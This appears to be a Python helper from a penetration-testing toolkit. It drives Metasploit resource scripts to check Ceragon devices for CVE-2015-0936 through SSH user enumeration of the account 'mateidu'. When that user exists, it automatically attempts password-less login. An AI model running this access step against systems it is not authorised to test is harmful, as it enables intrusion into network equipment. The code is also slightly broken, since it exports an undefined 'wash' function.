#!/usr/bin/env python

import os, sys
import re
from Colour import Colour


def detect():
    os.system("msfconsole -q -r ./check/vuln/ceragon/crg")
    shit = "User 'mateidu' not found"
    with open("/root/.msf4/loot/ssh_enumusers.txt") as f:
        found = False
        for line in f:
            #if re.search("\b{0}\b".format(w),line):
            if shit in line:
                #print "Evidence: \n"
                #print "-----------------------------------------------------\n"
                print (Colour.RED + "\n Evidence: " + Colour.END) + (line)
                print (Colour.GREEN + "\n NOT vulnerable (CVE-2015-0936)\n" + Colour.END)
                found = True
        if not found:
            print(Colour.GREEN + "VULNERABLE:  User 'mateidu' existed, attempting password-less authentication ....... \n" + Colour.END)
            login()
    sys.exit()

def login():
    os.system("msfconsole -q -r ./check/vuln/ceragon/access")
    sys.exit()

__all__ = ['detect', 'wash']
